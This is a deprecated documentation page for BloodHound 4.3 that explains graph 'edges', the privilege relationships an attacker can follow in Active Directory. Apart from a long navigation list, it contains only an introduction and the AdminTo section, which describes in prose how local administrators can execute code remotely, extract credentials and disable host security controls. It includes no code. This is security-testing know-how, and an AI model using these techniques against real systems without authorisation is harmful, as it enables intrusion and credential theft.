

<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
<meta content="https://bloodhound.specterops.io/resources/edges/overview" name="canonical" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Edges &mdash; BloodHound 4.3.1 documentation</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=b86133f3" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
      <link rel="stylesheet" type="text/css" href="../_static/css/custom.css?v=232b7ae2" />

  
      <script src="../_static/jquery.js?v=5d32c60e"></script>
      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../_static/documentation_options.js?v=0503a316"></script>
      <script src="../_static/doctools.js?v=9bcbadda"></script>
      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Further Reading/Viewing" href="../further-reading/further-reading.html" />
    <link rel="prev" title="Nodes" href="nodes.html" />
   
  

</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            BloodHound
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Installation</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../installation/windows.html">Windows</a></li>
<li class="toctree-l1"><a class="reference internal" href="../installation/osx.html">macOS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../installation/linux.html">Linux</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Data Collection</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../data-collection/sharphound.html">SharpHound</a></li>
<li class="toctree-l1"><a class="reference internal" href="../data-collection/sharphound-all-flags.html">All SharpHound Flags, Explained</a></li>
<li class="toctree-l1"><a class="reference internal" href="../data-collection/azurehound.html">AzureHound</a></li>
<li class="toctree-l1"><a class="reference internal" href="../data-collection/azurehound-all-flags.html">All AzureHound Flags, Explained</a></li>
<li class="toctree-l1"><a class="reference internal" href="../data-collection/bloodhound-py.html">BloodHound.py</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Data Analysis</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="bloodhound-gui.html">The BloodHound GUI</a></li>
<li class="toctree-l1"><a class="reference internal" href="nodes.html">Nodes</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Edges</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#adminto">AdminTo</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#abuse-info">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#opsec-considerations">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#references">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#memberof">MemberOf</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id1">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id2">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id3">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#hassession">HasSession</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id4">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id5">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id6">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#hassidhistory">HasSIDHistory</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id7">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id8">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id9">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#forcechangepassword">ForceChangePassword</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id10">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id11">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id12">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#addmembers">AddMembers</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id13">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id14">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id15">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#addself">AddSelf</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id16">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id17">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id18">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#canrdp">CanRDP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id19">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id20">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id21">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#canpsremote">CanPSRemote</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id22">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id23">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id24">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#executedcom">ExecuteDCOM</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id25">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id26">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id27">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#sqladmin">SQLAdmin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id28">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id29">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id30">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#allowedtodelegate">AllowedToDelegate</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id31">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id32">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id33">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#dcsync">DCSync</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id34">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id35">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id36">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#getchanges-getchangesall">GetChanges/GetChangesAll</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id37">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id38">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id39">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#genericall">GenericAll</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id40">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id41">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id42">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#writedacl">WriteDacl</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id43">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id44">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id45">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#genericwrite">GenericWrite</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id46">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id47">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id48">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#writeowner">WriteOwner</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id49">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id50">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id51">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#writespn">WriteSPN</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id52">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id53">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id54">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#owns">Owns</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id55">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id56">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id57">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#addkeycredentiallink">AddKeyCredentialLink</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id58">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id59">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id60">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#readlapspassword">ReadLAPSPassword</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id61">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id62">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id63">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#readgmsapassword">ReadGMSAPassword</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id64">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id65">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id66">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#contains">Contains</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id67">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id68">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id69">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#allextendedrights">AllExtendedRights</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id70">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id71">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id72">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#gplink">GPLink</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id73">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id74">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id75">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#allowedtoact">AllowedToAct</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id76">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id77">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id78">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#addallowedtoact">AddAllowedToAct</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id79">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id80">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id81">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#writeaccountrestrictions">WriteAccountRestrictions</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id82">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id83">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id84">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#trustedby">TrustedBy</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id85">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id86">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#synclapspassword">SyncLAPSPassword</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id87">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id88">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id89">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#dumpsmsapassword">DumpSMSAPassword</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id90">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id91">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id92">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azaddmembers">AZAddMembers</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id93">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id94">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id95">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azaddowner">AZAddOwner</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id96">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id97">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id98">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azaddsecret">AZAddSecret</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id99">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id100">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id101">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azakscontributor">AZAKSContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id102">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id103">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id104">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azappadmin">AZAppAdmin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id105">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id106">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id107">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azautomationcontributor">AZAutomationContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id108">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id109">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id110">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azaverecontributor">AZAvereContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id111">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id112">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id113">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azcloudappadmin">AZCloudAppAdmin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id114">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id115">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id116">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azcontains">AZContains</a></li>
<li class="toctree-l2"><a class="reference internal" href="#azcontributor">AZContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id117">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id118">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id119">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azexecutecommand">AZExecuteCommand</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id120">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id121">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id122">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azgetcertificates">AZGetCertificates</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id123">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id124">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id125">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azgetkeys">AZGetKeys</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id126">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id127">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id128">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azgetsecrets">AZGetSecrets</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id129">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id130">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id131">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azglobaladmin">AZGlobalAdmin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id132">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id133">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id134">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azhasrole">AZHasRole</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id135">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id136">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id137">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azkeyvaultcontributor">AZKeyVaultContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id138">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id139">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id140">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azlogicappcontributor">AZLogicAppContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id141">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id142">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id143">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmanagedidentity">AZManagedIdentity</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id144">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id145">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id146">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmemberof">AZMemberOf</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id147">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id148">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id149">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgaddmember">AZMGAddMember</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id150">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id151">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id152">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgaddowner">AZMGAddOwner</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id153">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id154">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id155">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgaddsecret">AZMGAddSecret</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id156">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id157">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id158">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgapplication-readwrite-all">AZMGApplication_ReadWrite_All</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id159">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id160">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id161">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgapproleassignment-readwrite-all">AZMGAppRoleAssignment_ReadWrite_All</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id162">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id163">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id164">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgdirectory-readwrite-all">AZMGDirectory_ReadWrite_All</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id165">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id166">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id167">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmggrantapproles">AZMGGrantAppRoles</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id168">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id169">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id170">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmggrantrole">AZMGGrantRole</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id171">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id172">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id173">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmggroupmember-readwrite-all">AZMGGroupMember_ReadWrite_All</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id174">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id175">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id176">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmggroup-readwrite-all">AZMGGroup_ReadWrite_All</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id177">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id178">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id179">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgrolemanagement-readwrite-directory">AZMGRoleManagement_ReadWrite_Directory</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id180">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id181">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id182">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azmgserviceprincipalendpoint-readwrite-all">AZMGServicePrincipalEndpoint_ReadWrite_All</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id183">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id184">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id185">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#aznoderesourcegroup">AZNodeResourceGroup</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id186">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id187">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id188">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azowns">AZOwns</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id189">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id190">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id191">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azprivilegedauthadmin">AZPrivilegedAuthAdmin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id192">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id193">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id194">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azprivilegedroleadmin">AZPrivilegedRoleAdmin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id195">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id196">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id197">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azresetpassword">AZResetPassword</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id198">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id199">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id200">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azrunsas">AZRunsAs</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id201">Abuse Info</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azuseraccessadministrator">AZUserAccessAdministrator</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id202">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id203">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id204">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azvmadminlogin">AZVMAdminLogin</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id205">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id206">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id207">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azvmcontributor">AZVMContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id208">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id212">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id213">References</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#azwebsitecontributor">AZWebsiteContributor</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id214">Abuse Info</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id215">Opsec Considerations</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id216">References</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Further Reading/Viewing</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../further-reading/further-reading.html">Further Reading/Viewing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../further-reading/json.html">BloodHound JSON Formats</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">BloodHound</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Edges</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/data-analysis/edges.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <div class="deprecated admonition">
<p class="admonition-title">Deprecated Documentation</p>
<p><strong>This documentation refers to deprecated BloodHound Legacy (version 4.3, released in 2023).</strong></p>
<p>Please use the <a class="reference external" href="https://bloodhound.specterops.io/resources/edges/overview">current BloodHound CE Documentation</a>.</p>
</div>
<section id="edges">
<h1>Edges<a class="headerlink" href="#edges" title="Link to this heading"></a></h1>
<p>Edges are part of the graph construct, and are represented as links that
connect one node to another. For example, this shows the user node for
David McGuire connected to two groups, “Domain Admins” and “Domain Users”,
via the “MemberOf” edge, indicating this user belongs to both of those
groups:</p>
<a class="reference internal image-reference" href="../_images/davidmcguire-edges.png"><img alt="David McGuire is a member of two groups" class="align-center" src="../_images/davidmcguire-edges.png" style="width: 700px;" />
</a>
<p>The direction of the edge always indicates the direct of attack, or the
direction of escalating privileges. For example, because the David McGuire
user belongs to the Domain Users and Domain Admins group, his user has the
same privileges both of those groups have.</p>
<div class="line-block">
<div class="line"><br /></div>
</div>
<hr class="docutils" />
<div class="line-block">
<div class="line"><br /></div>
</div>
<section id="adminto">
<h2>AdminTo<a class="headerlink" href="#adminto" title="Link to this heading"></a></h2>
<p>This edge indicates that principal is a local administrator on the target
computer. By default, administrators have several ways to perform remote
code execution on Windows systems, including via RDP, WMI, WinRM, the
Service Control Manager, and remote DCOM execution.</p>
<p>Further, administrators have several options for impersonating other users
logged onto the system, including plaintext password extraction, token
impersonation, and injecting into processes running as another user.</p>
<p>Finally, administrators can often disable host-based security controls that
would otherwise prevent the aforementioned techniques.</p>
